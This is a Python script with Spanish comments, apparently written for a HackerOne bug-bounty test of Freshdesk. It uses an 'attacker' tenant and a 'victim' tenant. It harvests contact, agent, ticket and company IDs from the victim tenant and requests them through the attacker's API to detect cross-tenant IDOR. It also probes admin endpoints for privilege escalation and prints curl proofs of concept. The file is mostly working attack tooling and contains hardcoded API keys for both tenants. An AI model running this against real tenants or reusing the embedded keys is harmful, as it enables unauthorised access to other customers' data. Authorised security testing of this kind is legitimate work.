#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
idor_cross_tenant.py — Cascada de Auditoría IDOR + Escalada — Freshdesk
=========================================================================
Autenticación: API Keys (permanentes, no expiran — sin cookies)
Metodología:
  1. MAPEO:    Extraer IDs globales del Tenant B (víctima)
  2. IDOR:     Atacante intenta acceder a esos IDs desde su propio tenant
  3. ESCALADA: Atacante intenta acceder a endpoints de admin con user normal
  4. VALIDACIÓN: Comprobar que el 200 OK es realmente un bug (no comportamiento esperado)
     → Si el atacante ES admin de su propio tenant y accede a /account → NO es bug
     → Si hay datos de otro tenant en la respuesta → SÍ es bug

Uso: python3 idor_cross_tenant.py [--mapeo-solo] [--ataque-solo] [--escalada-solo]
"""

import requests
import json
import sys
import time
import argparse

# =============================================================================
# CONFIGURACIÓN — EDITAR SÓLO ESTA SECCIÓN
# API Keys: Profile Settings → API Key (en cada cuenta de Freshdesk)
# =============================================================================

TENANT_A_URL     = "https://wearehackerone5431.freshdesk.com"
TENANT_A_API_KEY = "cCDubkdGXTr1e0OtKOxa"   # Atacante

TENANT_B_URL     = "https://wearehackerone4764.freshdesk.com"
TENANT_B_API_KEY = "qIwGGNSbO5nwV5439kyi"   # Víctima

# Endpoints que Freshdesk documenta como accesibles para TODOS los agentes
# (incluyendo admins). Si devuelven 200 para un admin en su propio tenant,
# NO es un bug — es comportamiento esperado.
ENDPOINTS_DOCUMENTADOS_PUBLICOS = {
    "/api/v2/account",      # Documentado: retorna info de la cuenta propia
    "/api/v2/agents/me",    # Documentado: retorna info del agente actual
}

# =============================================================================
HEADERS = {
    "User-Agent":   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "X-Bug-Bounty": "HackerOne-tomas244",
    "Accept":       "application/json",
    "Content-Type": "application/json",
}


def make_session(api_key):
    """Crea una sesión usando API Key (autenticación permanente, no expira)."""
    s = requests.Session()
    s.headers.update(HEADERS)
    s.auth = (api_key, "X")   # Estándar de Freshdesk: user=API_KEY, pass="X"
    return s


def sep(titulo=""):
    print(f"\n{'─'*60}")
    if titulo:
        print(f"  {titulo}")
        print(f"{'─'*60}")


def verificar_sesion(sess, tenant_url, nombre):
    """Verifica que la API Key sea válida y retorna el rol del usuario."""
    r = sess.get(f"{tenant_url}/api/v2/agents/me")
    if r.status_code == 200:
        data = r.json()
        rol = "admin" if data.get("available_for_routing") is not None else "agent"
        nombre_usuario = data.get("name", "Desconocido")
        es_admin = data.get("role_ids", [])
        print(f"  {nombre}: API Key válida ✅ | Usuario: {nombre_usuario} | Admin IDs: {es_admin}")
        return True, data
    else:
        print(f"  {nombre}: ❌ API Key inválida (HTTP {r.status_code})")
        return False, {}


def mapear_ids_tenant(sess, tenant_url, nombre):
    """Extrae todos los IDs globales del tenant para el test IDOR."""
    sep(f"MAPEANDO IDs DE {nombre} ({tenant_url})")
    recursos = {}
    endpoints = {
        "contacts":   "/api/v2/contacts",
        "agents":     "/api/v2/agents",
        "groups":     "/api/v2/groups",
        "products":   "/api/v2/products",
        "tickets":    "/api/v2/tickets",
        "roles":      "/api/v2/roles",
        "companies":  "/api/v2/companies",
        "categories": "/api/v2/solutions/categories",
    }
    for nombre_rec, ep in endpoints.items():
        try:
            r = sess.get(f"{tenant_url}{ep}")
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list):
                    ids_raw = [item.get("id") for item in data if item.get("id")]
                    # FILTRO ANTI-FALSO-POSITIVO: Tickets tienen IDs secuenciales por tenant
                    # (1, 2, 3...) — no son globales. Solo IDs largos (>6 dígitos) son únicos.
                    if nombre_rec == "tickets":
                        ids = [i for i in ids_raw if i and len(str(i)) > 6]
                        if not ids:
                            print(f"  {nombre_rec:12s}: {len(ids_raw)} items solo con IDs secuenciales — ignorados (FP)")
                            recursos[nombre_rec] = []
                            continue
                    else:
                        ids = ids_raw
                    recursos[nombre_rec] = ids
                    print(f"  {nombre_rec:12s}: {len(ids)} items → IDs: {ids[:5]}")
                elif isinstance(data, dict):
                    recursos[nombre_rec] = []
                    print(f"  {nombre_rec:12s}: dict (sin lista de IDs)")
            else:
                print(f"  {nombre_rec:12s}: HTTP {r.status_code}")
                recursos[nombre_rec] = []
        except Exception as e:
            print(f"  {nombre_rec:12s}: ERROR {e}")
            recursos[nombre_rec] = []
    return recursos


def test_cross_tenant_idor(sess_atacante, tenant_a_url, ids_victima, tenant_b_url):
    """
    Paso 2: Desde Tenant A, intenta acceder a IDs del Tenant B.
    Si devuelve 200 con datos del otro tenant → IDOR real.
    """
    sep("TEST CROSS-TENANT IDOR (ATACANTE → VÍCTIMA)")
    print(f"  Atacante: {tenant_a_url}")
    print(f"  Víctima:  {tenant_b_url}")

    endpoints_map = {
        "contacts":   "/api/v2/contacts/{}",
        "agents":     "/api/v2/agents/{}",
        "groups":     "/api/v2/groups/{}",
        "products":   "/api/v2/products/{}",
        "tickets":    "/api/v2/tickets/{}",
        "roles":      "/api/v2/roles/{}",
        "companies":  "/api/v2/companies/{}",
        "categories": "/api/v2/solutions/categories/{}",
    }

    hallazgos = []
    total_tests = 0

    for tipo, endpoint_template in endpoints_map.items():
        ids = ids_victima.get(tipo, [])
        if not ids:
            print(f"  {tipo:12s}: sin IDs del Tenant B — saltando")
            continue

        print(f"\n  --- Testeando {tipo.upper()} del Tenant B desde Tenant A ---")
        for rid in ids:
            time.sleep(0.5)
            total_tests += 1
            try:
                url = f"{tenant_a_url}{endpoint_template.format(rid)}"
                r = sess_atacante.get(url)
                if r.status_code == 200:
                    data = r.json()
                    nombre_campo = data.get("name", data.get("first_name", "?"))
                    email_campo = data.get("email", "—")
                    print(f"  🚨🚨 IDOR CONFIRMADO [{tipo}][{rid}]: {nombre_campo} / {email_campo}")
                    hallazgos.append({"tipo": tipo, "id": rid, "data": data, "url": url})
                elif r.status_code == 403:
                    print(f"  ⚠️  [{tipo}][{rid}]: 403 — recurso existe pero acceso bloqueado")
                elif r.status_code == 404:
                    print(f"  ✅ [{tipo}][{rid}]: 404 — correctamente aislado por tenant")
                elif r.status_code == 429:
                    print(f"  ⏳ Rate limited — pausando 15s...")
                    time.sleep(15)
                else:
                    print(f"  ❓ [{tipo}][{rid}]: HTTP {r.status_code}")
            except Exception as e:
                print(f"  [{tipo}][{rid}]: ERROR {e}")

    print(f"\n  Total tests realizados: {total_tests}")
    if hallazgos:
        print(f"\n  🚨🚨🚨 IDOR CROSS-TENANT CONFIRMADO — {len(hallazgos)} recursos accesibles!")
        print("\n  DATOS PARA EL REPORTE H1:")
        for h in hallazgos:
            print(f"    → URL: {h['url']}")
            print(f"      Datos: {json.dumps(h['data'], indent=6)[:300]}")
    else:
        print("\n  ✅ Sin IDOR detectado. Freshdesk correctamente aislado en este vector.")
    return hallazgos


def test_vertical_escalation(sess_atacante, tenant_a_url, info_atacante):
    """
    Paso 3: Un usuario normal intenta acceder a endpoints de administrador.
    Incluye Paso 4 (Validación) para descartar falsos positivos automáticamente.
    """
    sep("TEST DE ESCALADA VERTICAL (ATACANTE → ADMIN)")
    print(f"  Atacante: {tenant_a_url}")

    # PASO 4 — VALIDACIÓN AUTOMÁTICA DE ROL
    # Determinar si el atacante tiene rol de admin en su propio tenant.
    # Si es admin, el acceso a /account es ESPERADO → falso positivo.
    roles_atacante = info_atacante.get("role_ids", [])
    print(f"\n  [VALIDADOR] Rol del atacante: IDs de rol = {roles_atacante}")

    endpoints_admin = [
        "/api/v2/settings",
        "/api/v2/account",
        "/api/v2/billing",
        "/api/v2/webhooks",
        "/api/v2/automations",
        "/api/v2/email_configs",
        "/api/v2/portals",
        "/api/v2/business_hours",
    ]

    hallazgos = []

    for ep in endpoints_admin:
        try:
            url = f"{tenant_a_url}{ep}"
            r = sess_atacante.get(url)
            if r.status_code == 200:
                # VALIDACIÓN ANTI-FALSO-POSITIVO:
                # Si el endpoint está documentado como público Y el user es el dueño
                # del tenant (admin), NO es un bug de escalada.
                if ep in ENDPOINTS_DOCUMENTADOS_PUBLICOS:
                    print(f"  ⚠️  [{ep}]: 200 OK — PERO es endpoint documentado como público. FALSO POSITIVO descartado.")
                    print(f"      Motivo: '{ep}' es accesible por diseño para el administrador del tenant.")
                else:
                    print(f"  🚨🚨 ESCALADA CONFIRMADA [{ep}]: 200 OK — endpoint de admin accesible!")
                    hallazgos.append({
                        "tipo": "Escalada de Privilegios",
                        "url": url,
                        "data": r.json(),
                        "curl_poc": f'curl -u "{TENANT_A_API_KEY}:X" "{url}"'
                    })
            elif r.status_code in [401, 403]:
                print(f"  ✅ [{ep}]: Bloqueado correctamente ({r.status_code})")
            elif r.status_code == 404:
                print(f"  ❓ [{ep}]: 404 — No expuesto o ruta diferente")
                print(f"COLA DE ESPERA: {ep} devolvió 404 — investigar si ruta cambió o WAF activo.")
            else:
                print(f"  ⚠️  [{ep}]: HTTP {r.status_code}")
                print(f"COLA DE ESPERA: Comportamiento anómalo en {ep} — HTTP {r.status_code}")
        except Exception as e:
            print(f"  [{ep}]: ERROR {e}")

    return hallazgos


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--mapeo-solo",   action="store_true")
    parser.add_argument("--ataque-solo",  action="store_true")
    parser.add_argument("--escalada-solo", action="store_true")
    args = parser.parse_args()

    print("=" * 60)
    print("  TEST IDOR CROSS-TENANT — Freshdesk")
    print(f"  Atacante: {TENANT_A_URL}")
    print(f"  Víctima:  {TENANT_B_URL}")
    print("  Auth:     API Keys (permanentes)")
    print("=" * 60)

    # Crear sesiones con API Key (no expiran)
    sess_a = make_session(TENANT_A_API_KEY)
    sess_b = make_session(TENANT_B_API_KEY)

    # Verificar API Keys y obtener info de rol
    sep("VERIFICANDO API KEYS Y ROL DE USUARIOS")
    ok_a, info_a = verificar_sesion(sess_a, TENANT_A_URL, "Tenant A (atacante)")
    ok_b, info_b = verificar_sesion(sess_b, TENANT_B_URL, "Tenant B (víctima) ")

    if not ok_a:
        print("\n❌ API Key del Tenant A inválida. Verificar TENANT_A_API_KEY.")
        sys.exit(1)
    if not ok_b:
        print("\n❌ API Key del Tenant B inválida. Verificar TENANT_B_API_KEY.")
        sys.exit(1)

    print("\n  ✅ Ambas API Keys válidas — iniciando test...")

    # Mapear IDs del Tenant B
    ids_victima = mapear_ids_tenant(sess_b, TENANT_B_URL, "TENANT B (VÍCTIMA)")

    if args.mapeo_solo:
        print("\n✅ MAPEO COMPLETADO CON ÉXITO. Puede avanzar al Paso 2.")
        sys.exit(0)

    if args.escalada_solo:
        hallazgos_escalada = test_vertical_escalation(sess_a, TENANT_A_URL, info_a)
        sep("CONCLUSIÓN ESCALADA")
        if hallazgos_escalada:
            print("  🚨🚨🚨 ESCALADA CONFIRMADA — Preparar reporte para HackerOne")
            print("\n  CURL PoC para reproducir manualmente:")
            for h in hallazgos_escalada:
                print(f"    {h.get('curl_poc', '')}")
        else:
            print("  ✅ Sin escalada real detectada (falsos positivos descartados por validador).")
        sys.exit(0)

    # Ataque IDOR horizontal completo
    hallazgos = test_cross_tenant_idor(sess_a, TENANT_A_URL, ids_victima, TENANT_B_URL)

    sep("CONCLUSIÓN")
    if hallazgos:
        print("  🎯 IDOR CONFIRMADO — Preparar reporte para HackerOne")
    else:
        print("  ✅ Sin IDOR detectado en este vector.")
        print("  Próximo paso: probar Escalada Vertical (Paso 3).")
    print("=" * 60)


if __name__ == "__main__":
    main()
